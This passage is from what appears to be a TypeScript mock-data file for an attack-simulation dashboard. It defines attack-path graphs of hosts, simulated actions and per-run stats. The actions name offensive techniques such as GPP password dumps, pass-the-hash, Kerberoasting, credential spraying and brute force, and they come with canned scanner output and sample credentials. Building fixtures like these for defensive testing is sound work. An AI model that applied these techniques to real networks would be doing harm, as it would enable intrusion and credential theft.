    { edge_id: 's3-c32', edge_source: 's3-a32', edge_target: 's3-a33', edge_type: 'chain_flow', edge_label: 'pivot to DC' },
    { edge_id: 's3-c33', edge_source: 's3-a33', edge_target: 's3-a34', edge_type: 'chain_flow' },
    { edge_id: 's3-c34', edge_source: 's3-a34', edge_target: 's3-a35', edge_type: 'chain_flow', edge_label: 'domain pwned' },
    { edge_id: 's3-c35', edge_source: 's3-a35', edge_target: 's3-a36', edge_type: 'chain_flow' },
    { edge_id: 's3-c36', edge_source: 's3-a36', edge_target: 's3-a37', edge_type: 'chain_flow', edge_label: 'pivot mgmt' },
    { edge_id: 's3-c37', edge_source: 's3-a37', edge_target: 's3-a38', edge_type: 'chain_flow' },
    { edge_id: 's3-c38', edge_source: 's3-a38', edge_target: 's3-a39', edge_type: 'chain_flow' },
    { edge_id: 's3-c39', edge_source: 's3-a19', edge_target: 's3-a40', edge_type: 'chain_flow', edge_label: 'parallel' },

    // ── asset_link (action → target endpoint) ────────────────────────────────
    { edge_id: 's3-l01', edge_source: 's3-a01', edge_target: 's3-dmz-web-01', edge_type: 'asset_link' },
    { edge_id: 's3-l02', edge_source: 's3-a02', edge_target: 's3-dmz-web-01', edge_type: 'asset_link' },
    { edge_id: 's3-l03', edge_source: 's3-a03', edge_target: 's3-dmz-web-02', edge_type: 'asset_link' },
    { edge_id: 's3-l04', edge_source: 's3-a04', edge_target: 's3-dmz-ftp-01', edge_type: 'asset_link' },
    { edge_id: 's3-l05', edge_source: 's3-a05', edge_target: 's3-dmz-mail-01', edge_type: 'asset_link' },
    { edge_id: 's3-l06', edge_source: 's3-a06', edge_target: 's3-dmz-web-03', edge_type: 'asset_link' },
    { edge_id: 's3-l07', edge_source: 's3-a07', edge_target: 's3-peri-proxy-01', edge_type: 'asset_link' },
    { edge_id: 's3-l08', edge_source: 's3-a08', edge_target: 's3-peri-proxy-02', edge_type: 'asset_link' },
    { edge_id: 's3-l09', edge_source: 's3-a09', edge_target: 's3-peri-fw-01', edge_type: 'asset_link' },
    { edge_id: 's3-l10', edge_source: 's3-a10', edge_target: 's3-peri-fw-01', edge_type: 'asset_link' },
    { edge_id: 's3-l11', edge_source: 's3-a11', edge_target: 's3-exec-ws-02', edge_type: 'asset_link' },
    { edge_id: 's3-l12', edge_source: 's3-a12', edge_target: 's3-exec-ws-02', edge_type: 'asset_link' },
    { edge_id: 's3-l13', edge_source: 's3-a13', edge_target: 's3-exec-ws-01', edge_type: 'asset_link' },
    { edge_id: 's3-l14', edge_source: 's3-a14', edge_target: 's3-exec-ws-02', edge_type: 'asset_link' },
    { edge_id: 's3-l15', edge_source: 's3-a15', edge_target: 's3-exec-ws-03', edge_type: 'asset_link' },
    { edge_id: 's3-l16', edge_source: 's3-a16', edge_target: 's3-exec-ws-04', edge_type: 'asset_link' },
    { edge_id: 's3-l17', edge_source: 's3-a17', edge_target: 's3-exec-laptop-01', edge_type: 'asset_link' },
    { edge_id: 's3-l18', edge_source: 's3-a18', edge_target: 's3-exec-mac-01', edge_type: 'asset_link' },
    { edge_id: 's3-l19', edge_source: 's3-a19', edge_target: 's3-exec-printer-01', edge_type: 'asset_link' },
    { edge_id: 's3-l20', edge_source: 's3-a20', edge_target: 's3-eng-ws-01', edge_type: 'asset_link' },
    { edge_id: 's3-l21', edge_source: 's3-a21', edge_target: 's3-eng-build-01', edge_type: 'asset_link' },
    { edge_id: 's3-l22', edge_source: 's3-a22', edge_target: 's3-eng-deploy-01', edge_type: 'asset_link' },
    { edge_id: 's3-l23', edge_source: 's3-a23', edge_target: 's3-eng-ws-02', edge_type: 'asset_link' },
    { edge_id: 's3-l24', edge_source: 's3-a24', edge_target: 's3-fin-ws-01', edge_type: 'asset_link' },
    { edge_id: 's3-l25', edge_source: 's3-a25', edge_target: 's3-fin-ws-02', edge_type: 'asset_link' },
    { edge_id: 's3-l26', edge_source: 's3-a26', edge_target: 's3-fin-erp-01', edge_type: 'asset_link' },
    { edge_id: 's3-l27', edge_source: 's3-a27', edge_target: 's3-fin-reporting-01', edge_type: 'asset_link' },
    { edge_id: 's3-l28', edge_source: 's3-a28', edge_target: 's3-srv-web-01', edge_type: 'asset_link' },
    { edge_id: 's3-l29', edge_source: 's3-a29', edge_target: 's3-srv-api-01', edge_type: 'asset_link' },
    { edge_id: 's3-l30', edge_source: 's3-a30', edge_target: 's3-srv-api-02', edge_type: 'asset_link' },
    { edge_id: 's3-l31', edge_source: 's3-a31', edge_target: 's3-db-mssql-01', edge_type: 'asset_link' },
    { edge_id: 's3-l32', edge_source: 's3-a32', edge_target: 's3-db-oracle-01', edge_type: 'asset_link' },
    { edge_id: 's3-l33', edge_source: 's3-a33', edge_target: 's3-mgmt-dc-01', edge_type: 'asset_link' },
    { edge_id: 's3-l34', edge_source: 's3-a34', edge_target: 's3-mgmt-dc-01', edge_type: 'asset_link' },
    { edge_id: 's3-l35', edge_source: 's3-a35', edge_target: 's3-mgmt-dc-02', edge_type: 'asset_link' },
    { edge_id: 's3-l36', edge_source: 's3-a36', edge_target: 's3-mgmt-ca-01', edge_type: 'asset_link' },
    { edge_id: 's3-l37', edge_source: 's3-a37', edge_target: 's3-mgmt-jump-01', edge_type: 'asset_link' },
    { edge_id: 's3-l38', edge_source: 's3-a38', edge_target: 's3-db-pg-01', edge_type: 'asset_link' },
    { edge_id: 's3-l39', edge_source: 's3-a39', edge_target: 's3-mgmt-siem-01', edge_type: 'asset_link' },
    { edge_id: 's3-l40', edge_source: 's3-a40', edge_target: 's3-eng-ws-03', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-dmz-web01', edge_source: 's3-a-nmap-bulk', edge_target: 's3-dmz-web-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-dmz-web02', edge_source: 's3-a-nmap-bulk', edge_target: 's3-dmz-web-02', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-dmz-web03', edge_source: 's3-a-nmap-bulk', edge_target: 's3-dmz-web-03', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-dmz-mail01', edge_source: 's3-a-nmap-bulk', edge_target: 's3-dmz-mail-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-dmz-ftp01', edge_source: 's3-a-nmap-bulk', edge_target: 's3-dmz-ftp-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-peri-fw01', edge_source: 's3-a-nmap-bulk', edge_target: 's3-peri-fw-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-peri-proxy01', edge_source: 's3-a-nmap-bulk', edge_target: 's3-peri-proxy-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-peri-proxy02', edge_source: 's3-a-nmap-bulk', edge_target: 's3-peri-proxy-02', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-exec-ws01', edge_source: 's3-a-nmap-bulk', edge_target: 's3-exec-ws-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-exec-ws02', edge_source: 's3-a-nmap-bulk', edge_target: 's3-exec-ws-02', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-exec-ws03', edge_source: 's3-a-nmap-bulk', edge_target: 's3-exec-ws-03', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-exec-ws04', edge_source: 's3-a-nmap-bulk', edge_target: 's3-exec-ws-04', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-exec-ws05', edge_source: 's3-a-nmap-bulk', edge_target: 's3-exec-ws-05', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-exec-printer', edge_source: 's3-a-nmap-bulk', edge_target: 's3-exec-printer-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-exec-laptop', edge_source: 's3-a-nmap-bulk', edge_target: 's3-exec-laptop-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-exec-mac', edge_source: 's3-a-nmap-bulk', edge_target: 's3-exec-mac-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-eng-ws01', edge_source: 's3-a-nmap-bulk', edge_target: 's3-eng-ws-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-eng-ws02', edge_source: 's3-a-nmap-bulk', edge_target: 's3-eng-ws-02', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-eng-ws03', edge_source: 's3-a-nmap-bulk', edge_target: 's3-eng-ws-03', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-eng-ws04', edge_source: 's3-a-nmap-bulk', edge_target: 's3-eng-ws-04', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-eng-ws05', edge_source: 's3-a-nmap-bulk', edge_target: 's3-eng-ws-05', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-eng-build', edge_source: 's3-a-nmap-bulk', edge_target: 's3-eng-build-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-eng-deploy', edge_source: 's3-a-nmap-bulk', edge_target: 's3-eng-deploy-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-fin-ws01', edge_source: 's3-a-nmap-bulk', edge_target: 's3-fin-ws-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-fin-ws02', edge_source: 's3-a-nmap-bulk', edge_target: 's3-fin-ws-02', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-fin-ws03', edge_source: 's3-a-nmap-bulk', edge_target: 's3-fin-ws-03', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-fin-ws04', edge_source: 's3-a-nmap-bulk', edge_target: 's3-fin-ws-04', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-fin-erp', edge_source: 's3-a-nmap-bulk', edge_target: 's3-fin-erp-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-fin-rep', edge_source: 's3-a-nmap-bulk', edge_target: 's3-fin-reporting-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-srv-web01', edge_source: 's3-a-nmap-bulk', edge_target: 's3-srv-web-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-srv-web02', edge_source: 's3-a-nmap-bulk', edge_target: 's3-srv-web-02', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-srv-web03', edge_source: 's3-a-nmap-bulk', edge_target: 's3-srv-web-03', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-srv-api01', edge_source: 's3-a-nmap-bulk', edge_target: 's3-srv-api-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-srv-api02', edge_source: 's3-a-nmap-bulk', edge_target: 's3-srv-api-02', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-db-mssql', edge_source: 's3-a-nmap-bulk', edge_target: 's3-db-mssql-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-db-oracle', edge_source: 's3-a-nmap-bulk', edge_target: 's3-db-oracle-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-db-pg', edge_source: 's3-a-nmap-bulk', edge_target: 's3-db-pg-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-db-redis', edge_source: 's3-a-nmap-bulk', edge_target: 's3-db-redis-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-db-mongo', edge_source: 's3-a-nmap-bulk', edge_target: 's3-db-mongo-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-mgmt-dc01', edge_source: 's3-a-nmap-bulk', edge_target: 's3-mgmt-dc-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-mgmt-dc02', edge_source: 's3-a-nmap-bulk', edge_target: 's3-mgmt-dc-02', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-mgmt-ca', edge_source: 's3-a-nmap-bulk', edge_target: 's3-mgmt-ca-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-mgmt-jump', edge_source: 's3-a-nmap-bulk', edge_target: 's3-mgmt-jump-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-mgmt-siem', edge_source: 's3-a-nmap-bulk', edge_target: 's3-mgmt-siem-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-vpn-r01', edge_source: 's3-a-nmap-bulk', edge_target: 's3-vpn-remote-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-vpn-r02', edge_source: 's3-a-nmap-bulk', edge_target: 's3-vpn-remote-02', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-vpn-r03', edge_source: 's3-a-nmap-bulk', edge_target: 's3-vpn-remote-03', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-vpn-r04', edge_source: 's3-a-nmap-bulk', edge_target: 's3-vpn-remote-04', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-backup-nfs', edge_source: 's3-a-nmap-bulk', edge_target: 's3-backup-nfs-01', edge_type: 'asset_link' },
    { edge_id: 's3-nmap-backup-tape', edge_source: 's3-a-nmap-bulk', edge_target: 's3-backup-tape-01', edge_type: 'asset_link' },
  ],

  attack_path_stats: {
    stats_prevented: 3,
    stats_detected: 7,
    stats_undetected: 30,
    stats_pending: 0,
    stats_total_actions: 41,
    stats_executed_actions: 41,
    stats_captured_endpoints: 30,
    stats_captured_files: 22,
    stats_captured_credentials: 16,
    stats_captured_users: 11,
    stats_captured_cves: 7,
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// SCENARIO 1 – Finance Run #2  (SOC detected lateral movement early)
// Stats: 3 undetected, 5 detected, 2 prevented, 0 pending (8 total with spray)
// ─────────────────────────────────────────────────────────────────────────────
export const MOCK_SCENARIO_5EP_RUN2: AttackPathData = {
  attack_path_nodes: [
    { node_id: 'r2-ep01', node_type: 'ASSET', node_label: 'FINANCE-WS-01', node_hostname: 'FINANCE-WS-01', node_ip: '192.168.10.101', node_platform: 'Windows 10', node_status: 'detected', node_user_privileges: 'DOMAIN\\jsmith (User)', node_accessed_files: ['C:\\Users\\jsmith\\Documents\\budget_Q4.xlsx'], node_credentials_found: ['jsmith:Passw0rd!'], node_zone: 'Finance LAN', node_subnet: '192.168.10.0/24', node_is_entry_point: true, node_is_pivot: true, node_agents: ['palo_alto', 'sentinel_one', 'openaev'], },
    { node_id: 'r2-ep02', node_type: 'ASSET', node_label: 'FILE-SRV-01', node_hostname: 'FILE-SRV-01', node_ip: '192.168.10.10', node_platform: 'Windows Server 2019', node_status: 'prevented', node_zone: 'Finance LAN', node_subnet: '192.168.10.0/24', node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 'r2-ep03', node_type: 'ASSET', node_label: 'DC-01', node_hostname: 'DC-01', node_ip: '192.168.1.5', node_platform: 'Windows Server 2022', node_status: 'detected', node_zone: 'Domain', node_subnet: '192.168.1.0/24', node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 'r2-ep04', node_type: 'ASSET', node_label: 'DEV-MAC-02', node_hostname: 'DEV-MAC-02', node_ip: '192.168.10.150', node_platform: 'macOS Sonoma 14.4', node_status: 'pending', node_zone: 'Finance LAN', node_subnet: '192.168.10.0/24', node_untouched: true, node_agents: ['palo_alto'], },
    { node_id: 'r2-ep05', node_type: 'ASSET', node_label: 'BACKUP-LX-01', node_hostname: 'BACKUP-LX-01', node_ip: '192.168.10.20', node_platform: 'Ubuntu 22.04 LTS', node_status: 'prevented', node_zone: 'Finance LAN', node_subnet: '192.168.10.0/24', node_agents: ['sentinel_one'], },
    // Actions
    { node_id: 'r2-a01', node_type: 'ACTION', node_label: 'Nmap TCP SYN Scan', node_status: 'undetected', node_payload_name: 'nmap – TCP SYN Scan', node_executed_at: '2026-06-15T08:02:11Z', node_agent: 'openaev', node_ip: '192.168.10.101', node_terminal_output: 'Nmap scan report for FINANCE-WS-01 (192.168.10.101)\nPORT 445/tcp open microsoft-ds\nNmap done: 1 IP address scanned in 2.34 seconds' },
    { node_id: 'r2-a02', node_type: 'ACTION', node_label: 'SMB AV Enumeration', node_status: 'undetected', node_payload_name: 'netexec – SMB enum_av', node_executed_at: '2026-06-15T08:04:33Z', node_agent: 'palo_alto', node_ip: '192.168.10.101', node_terminal_output: 'SMB 192.168.10.101 445 FINANCE-WS-01 [+] No AV detected' },
    { node_id: 'r2-a03', node_type: 'ACTION', node_label: 'SMB GPP Password Dump', node_status: 'detected', node_payload_name: 'netexec – SMB gpp_password', node_executed_at: '2026-06-15T08:07:45Z', node_agent: 'openaev', node_ip: '192.168.10.101', node_credentials_found: ['jsmith:Passw0rd!', 'svc_backup:Backup@2024'], node_expectations: [{ expectation_id: 'r2e1', expectation_type: 'DETECTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[+] GPP credential dump detected by SIEM — alert triggered\n[!] DETECTION: Windows Event ID 4663 logged' },
    { node_id: 'r2-a04', node_type: 'ACTION', node_label: 'SMB Pass-the-Hash Lateral', node_status: 'detected', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2026-06-15T08:12:01Z', node_agent: 'openaev', node_ip: '192.168.10.10', node_expectations: [{ expectation_id: 'r2e2', expectation_type: 'DETECTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[!] DETECTION: Lateral movement alert — EDR blocked pass-the-hash to FILE-SRV-01' },
    { node_id: 'r2-a05', node_type: 'ACTION', node_label: 'WMI Remote Code Exec', node_status: 'prevented', node_payload_name: 'netexec – WMI command exec', node_executed_at: '2026-06-15T08:15:22Z', node_agent: 'palo_alto', node_ip: '192.168.10.10', node_expectations: [{ expectation_id: 'r2e3', expectation_type: 'PREVENTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[!] PREVENTION: WMI execution blocked by EDR\n[-] Unable to deploy agent to FILE-SRV-01' },
    { node_id: 'r2-a06', node_type: 'ACTION', node_label: 'LDAP Kerberoasting', node_status: 'detected', node_payload_name: 'netexec – LDAP Kerberoasting', node_executed_at: '2026-06-15T08:19:55Z', node_agent: 'sentinel_one', node_ip: '192.168.1.5', node_expectations: [{ expectation_id: 'r2e4', expectation_type: 'DETECTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[!] DETECTION: Kerberoasting attempt detected — SIEM alert KRB_ROAST triggered' },
    { node_id: 'r2-a07', node_type: 'ACTION', node_label: 'SSH Brute Force', node_status: 'prevented', node_payload_name: 'netexec – SSH brute force', node_executed_at: '2026-06-15T08:22:10Z', node_agent: 'palo_alto', node_ip: '192.168.10.20', node_expectations: [{ expectation_id: 'r2e5', expectation_type: 'PREVENTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[!] PREVENTION: SSH brute force blocked by Fail2Ban after 2 attempts' },
    { node_id: 'r2-a-spray', node_type: 'ACTION', node_label: 'Netexec SMB Credential Spray', node_status: 'detected', node_payload_name: 'netexec – SMB spray', node_executed_at: '2026-06-15T08:25:00Z', node_agent: 'sentinel_one', node_ip: '192.168.10.0/24', node_chain_previous: 'r2-a03', node_expectations: [{ expectation_id: 'r2e6', expectation_type: 'DETECTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[+] Spray attempt detected by SIEM — SOC alerted\n[!] Credential spray from 192.168.10.101 blocked at FILE-SRV-01' },
    {
      node_id: 'r2-a-nmap-bulk',
      node_type: 'ACTION',
      node_label: 'Nmap Finance LAN Discovery',
      node_status: 'undetected',
      node_payload_name: 'nmap – TCP SYN Scan (Finance LAN)',
      node_executed_at: '2026-06-15T08:00:30Z',
      node_agent: 'openaev',
      node_ip: '192.168.10.0/24',
      node_terminal_output: `Starting Nmap 7.94 at 2026-06-15 08:00 UTC
Nmap scan report for 192.168.10.10 (FILE-SRV-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 192.168.1.5 (DC-01)
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
389/tcp open  ldap
445/tcp open  microsoft-ds
636/tcp open  ldapssl

Nmap scan report for 192.168.10.150 (DEV-MAC-02)
HOST: up
22/tcp  open  ssh
5900/tcp open  vnc

Nmap scan report for 192.168.10.20 (BACKUP-LX-01)
HOST: up
22/tcp  open  ssh
111/tcp open  rpcbind

Nmap done: 254 IP addresses (4 hosts up) scanned in 12.4 seconds`,
    },
  ],
  attack_path_edges: [
    { edge_id: 'r2-c1', edge_source: 'r2-a01', edge_target: 'r2-a02', edge_type: 'chain_flow' },
    { edge_id: 'r2-c2', edge_source: 'r2-a02', edge_target: 'r2-a03', edge_type: 'chain_flow' },
    { edge_id: 'r2-c3', edge_source: 'r2-a03', edge_target: 'r2-a04', edge_type: 'chain_flow', edge_label: 'credential reuse' },
    { edge_id: 'r2-c4', edge_source: 'r2-a04', edge_target: 'r2-a05', edge_type: 'chain_flow' },
    { edge_id: 'r2-c5', edge_source: 'r2-a05', edge_target: 'r2-a06', edge_type: 'chain_flow', edge_label: 'pivot to DC' },
    { edge_id: 'r2-c6', edge_source: 'r2-a06', edge_target: 'r2-a07', edge_type: 'chain_flow', edge_label: 'lateral' },
    { edge_id: 'r2-spray-chain', edge_source: 'r2-a03', edge_target: 'r2-a-spray', edge_type: 'chain_flow', edge_label: 'credential reuse' },
    { edge_id: 'r2-l1', edge_source: 'r2-a01', edge_target: 'r2-ep01', edge_type: 'asset_link' },
    { edge_id: 'r2-l2', edge_source: 'r2-a02', edge_target: 'r2-ep01', edge_type: 'asset_link' },
    { edge_id: 'r2-l3', edge_source: 'r2-a03', edge_target: 'r2-ep01', edge_type: 'asset_link' },
    { edge_id: 'r2-l4', edge_source: 'r2-a04', edge_target: 'r2-ep02', edge_type: 'asset_link' },
    { edge_id: 'r2-l5', edge_source: 'r2-a05', edge_target: 'r2-ep02', edge_type: 'asset_link' },
    { edge_id: 'r2-l6', edge_source: 'r2-a06', edge_target: 'r2-ep03', edge_type: 'asset_link' },
    { edge_id: 'r2-l7', edge_source: 'r2-a07', edge_target: 'r2-ep05', edge_type: 'asset_link' },
    { edge_id: 'r2-spray-ep01', edge_source: 'r2-a-spray', edge_target: 'r2-ep01', edge_type: 'asset_link' },
    { edge_id: 'r2-spray-ep02', edge_source: 'r2-a-spray', edge_target: 'r2-ep02', edge_type: 'asset_link' },
    { edge_id: 'r2-disc01', edge_source: 'r2-ep01', edge_target: 'r2-ep04', edge_type: 'discovery', edge_label: 'nmap scan' },
    { edge_id: 'r2-nmap-ep02', edge_source: 'r2-a-nmap-bulk', edge_target: 'r2-ep02', edge_type: 'asset_link' },
    { edge_id: 'r2-nmap-ep03', edge_source: 'r2-a-nmap-bulk', edge_target: 'r2-ep03', edge_type: 'asset_link' },
    { edge_id: 'r2-nmap-ep04', edge_source: 'r2-a-nmap-bulk', edge_target: 'r2-ep04', edge_type: 'asset_link' },
    { edge_id: 'r2-nmap-ep05', edge_source: 'r2-a-nmap-bulk', edge_target: 'r2-ep05', edge_type: 'asset_link' },
  ],
  attack_path_stats: {
    stats_prevented: 2,
    stats_detected: 5,
    stats_undetected: 3,
    stats_pending: 0,
    stats_total_actions: 9,
    stats_executed_actions: 9,
    stats_captured_endpoints: 2,
    stats_captured_files: 1,
    stats_captured_credentials: 1,
    stats_captured_users: 1,
    stats_captured_cves: 1,
  },
};

// ─────────────────────────────────────────────────────────────────────────────
// SCENARIO 1 – Finance Run #3  (Hardened environment, strong security posture)
// Stats: 1 undetected, 2 detected, 6 prevented
// ─────────────────────────────────────────────────────────────────────────────
export const MOCK_SCENARIO_5EP_RUN3: AttackPathData = {
  attack_path_nodes: [
    { node_id: 'r3-ep01', node_type: 'ASSET', node_label: 'FINANCE-WS-01', node_hostname: 'FINANCE-WS-01', node_ip: '192.168.10.101', node_platform: 'Windows 10', node_status: 'detected', node_zone: 'Finance LAN', node_subnet: '192.168.10.0/24', node_is_entry_point: true, node_agents: ['palo_alto', 'openaev'], },
    { node_id: 'r3-ep02', node_type: 'ASSET', node_label: 'FILE-SRV-01', node_hostname: 'FILE-SRV-01', node_ip: '192.168.10.10', node_platform: 'Windows Server 2019', node_status: 'prevented', node_zone: 'Finance LAN', node_subnet: '192.168.10.0/24', node_agents: ['openaev'], },
    { node_id: 'r3-ep03', node_type: 'ASSET', node_label: 'DC-01', node_hostname: 'DC-01', node_ip: '192.168.1.5', node_platform: 'Windows Server 2022', node_status: 'prevented', node_zone: 'Domain', node_subnet: '192.168.1.0/24', node_agents: ['palo_alto', 'sentinel_one'], },
    { node_id: 'r3-ep04', node_type: 'ASSET', node_label: 'DEV-MAC-02', node_hostname: 'DEV-MAC-02', node_ip: '192.168.10.150', node_platform: 'macOS Sonoma 14.4', node_status: 'pending', node_zone: 'Finance LAN', node_subnet: '192.168.10.0/24', node_untouched: true, node_agents: ['openaev'], },
    { node_id: 'r3-ep05', node_type: 'ASSET', node_label: 'BACKUP-LX-01', node_hostname: 'BACKUP-LX-01', node_ip: '192.168.10.20', node_platform: 'Ubuntu 22.04 LTS', node_status: 'prevented', node_zone: 'Finance LAN', node_subnet: '192.168.10.0/24', node_agents: ['sentinel_one', 'openaev'], },
    // Actions
    { node_id: 'r3-a01', node_type: 'ACTION', node_label: 'Nmap TCP SYN Scan', node_status: 'undetected', node_payload_name: 'nmap – TCP SYN Scan', node_executed_at: '2026-07-01T08:02:11Z', node_agent: 'openaev', node_ip: '192.168.10.101', node_terminal_output: 'Nmap scan report for FINANCE-WS-01 (192.168.10.101)\nHost is up. Limited ports visible (firewall active)' },
    { node_id: 'r3-a02', node_type: 'ACTION', node_label: 'SMB AV Enumeration', node_status: 'detected', node_payload_name: 'netexec – SMB enum_av', node_executed_at: '2026-07-01T08:04:33Z', node_agent: 'palo_alto', node_ip: '192.168.10.101', node_expectations: [{ expectation_id: 'r3e1', expectation_type: 'DETECTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[!] DETECTION: SMB enumeration detected by EDR — alert triggered' },
    { node_id: 'r3-a03', node_type: 'ACTION', node_label: 'SMB GPP Password Dump', node_status: 'prevented', node_payload_name: 'netexec – SMB gpp_password', node_executed_at: '2026-07-01T08:07:45Z', node_agent: 'sentinel_one', node_ip: '192.168.10.101', node_expectations: [{ expectation_id: 'r3e2', expectation_type: 'PREVENTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[!] PREVENTION: GPP credential dump blocked — SYSVOL ACL hardened\n[-] No Groups.xml accessible' },
    { node_id: 'r3-a04', node_type: 'ACTION', node_label: 'SMB Pass-the-Hash Lateral', node_status: 'prevented', node_payload_name: 'netexec – SMB pass-the-hash', node_executed_at: '2026-07-01T08:12:01Z', node_agent: 'sentinel_one', node_ip: '192.168.10.10', node_expectations: [{ expectation_id: 'r3e3', expectation_type: 'PREVENTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[!] PREVENTION: Pass-the-hash blocked — Credential Guard enabled\n[-] NTLMv2 relay attempt failed' },
    { node_id: 'r3-a05', node_type: 'ACTION', node_label: 'WMI Remote Code Exec', node_status: 'prevented', node_payload_name: 'netexec – WMI command exec', node_executed_at: '2026-07-01T08:15:22Z', node_agent: 'openaev', node_ip: '192.168.10.10', node_expectations: [{ expectation_id: 'r3e4', expectation_type: 'PREVENTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[!] PREVENTION: WMI access blocked — AppLocker policy active' },
    { node_id: 'r3-a06', node_type: 'ACTION', node_label: 'LDAP Kerberoasting', node_status: 'detected', node_payload_name: 'netexec – LDAP Kerberoasting', node_executed_at: '2026-07-01T08:19:55Z', node_agent: 'sentinel_one', node_ip: '192.168.1.5', node_expectations: [{ expectation_id: 'r3e5', expectation_type: 'DETECTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[!] DETECTION: Kerberoasting attempt detected — all service accounts use AES256, not crackable' },
    { node_id: 'r3-a07', node_type: 'ACTION', node_label: 'SSH Brute Force', node_status: 'prevented', node_payload_name: 'netexec – SSH brute force', node_executed_at: '2026-07-01T08:22:10Z', node_agent: 'palo_alto', node_ip: '192.168.10.20', node_expectations: [{ expectation_id: 'r3e6', expectation_type: 'PREVENTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[!] PREVENTION: SSH brute force blocked — key-based auth only, password disabled' },
    { node_id: 'r3-a-spray', node_type: 'ACTION', node_label: 'Netexec SMB Credential Spray', node_status: 'prevented', node_payload_name: 'netexec – SMB spray', node_executed_at: '2026-07-01T08:25:00Z', node_agent: 'openaev', node_ip: '192.168.10.0/24', node_chain_previous: 'r3-a03', node_expectations: [{ expectation_id: 'r3e7', expectation_type: 'PREVENTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }], node_terminal_output: '[!] PREVENTION: Credential spray blocked — account lockout policy triggered after 1 attempt' },
    {
      node_id: 'r3-a-nmap-bulk',
      node_type: 'ACTION',
      node_label: 'Nmap Finance LAN Discovery',
      node_status: 'undetected',
      node_payload_name: 'nmap – TCP SYN Scan (Finance LAN)',
      node_executed_at: '2026-07-01T08:00:30Z',
      node_agent: 'openaev',
      node_ip: '192.168.10.0/24',
      node_terminal_output: `Starting Nmap 7.94 at 2026-07-01 08:00 UTC
Nmap scan report for 192.168.10.10 (FILE-SRV-01)
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 192.168.1.5 (DC-01)
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
389/tcp open  ldap
445/tcp open  microsoft-ds

Nmap scan report for 192.168.10.150 (DEV-MAC-02)
HOST: up
22/tcp  open  ssh
5900/tcp open  vnc

Nmap scan report for 192.168.10.20 (BACKUP-LX-01)
HOST: up
22/tcp  open  ssh
111/tcp open  rpcbind

